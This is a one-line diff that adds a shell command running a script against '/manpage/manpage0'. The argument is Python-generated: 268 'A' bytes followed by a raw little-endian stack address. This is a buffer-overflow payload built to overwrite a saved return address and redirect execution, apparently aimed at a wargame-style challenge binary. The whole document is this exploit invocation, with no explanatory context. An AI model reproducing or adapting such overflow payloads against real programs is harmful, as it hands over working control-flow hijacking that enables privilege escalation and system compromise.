@@ -1,0 +1,1 @@
+./r.sh /manpage/manpage0 $(python -c 'print "A"*268+"\x4b\xdf\xff\xff"')
